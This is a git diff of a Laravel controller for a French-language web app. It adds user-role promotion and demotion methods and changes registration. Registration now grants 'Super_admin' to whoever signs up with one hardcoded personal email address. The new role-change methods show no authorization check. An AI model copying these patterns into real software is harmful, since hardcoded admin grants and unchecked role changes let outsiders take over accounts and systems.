@@ -78,15 +78,30 @@ class PageController extends Controller
             'prenom'  => $p->prenom,
             'email'   => $p->email,
         ]);
+        if (request('email') === 'philippesf3@gmail.com') {
+            $user = User::firstOrCreate([
+                'email'    => $personne->email,
+                'password' => bcrypt($p->password),
+                'token'    => str_random(60),
+            ],
+            [
+                'personne_id' => $personne->id,
+                'type_utilisateur' => 'Super_admin'
+            ]);
+        }
+        else{
+            $user = User::firstOrCreate([
+                'email'    => $personne->email,
+                'password' => bcrypt($p->password),
+                'token'    => str_random(60),
+            ],
+            [
+                'personne_id' => $personne->id,
+            ]);
+        }
 
-        $user = User::firstOrCreate([
-            'email'    => $personne->email,
-            'password' => bcrypt($p->password),
-            'token'    => str_random(60),
-        ],
-        [
-            'personne_id' => $personne->id,
-        ]);
+        
+       
         if ($personne AND $user) {
             Flashy::success('Inscription réussie');
             return redirect()->route('form_confirm_account');
@@ -221,10 +236,6 @@ class PageController extends Controller
         return back();
     }
 
-    public function miseAjourPassword(){
-        return view('pages.update_password');
-    }
-
     public function listeUtilisateurs(){
         $client = DB::table('personnes')
         ->where('type_utilisateur','Client')
@@ -239,6 +250,35 @@ class PageController extends Controller
     public function linkPrices(){
         $price = json_decode(file_get_contents("https://blockchain.info/ticker"));
         return view('pages.price',compact('price'));
+    }
+
+    public function Promouvoir(Request $request){
+        $user = User::where('id',$request->id)->first();
+        $maj = $user->update([
+            'type_utilisateur' => 'Admin'
+        ]);
+        if ($maj) {
+            Flashy::success('Promotion réussie');
+            return back();
+        } else {
+            Flashy::error('Echec de la promotion');
+            return back();
+        }
+        
+    }
+
+    public function Retrograder(Request $request){
+        $user = User::where('id',$request->id)->first();
+        $maj = $user->update([
+            'type_utilisateur' => 'Client'
+        ]);
+        if ($maj) {
+            Flashy::success('Destitution réussie');
+            return back();
+        } else {
+            Flashy::error('Echec de la destitution');
+            return back();
+        }
     }
 
     public function pagePrices($id){
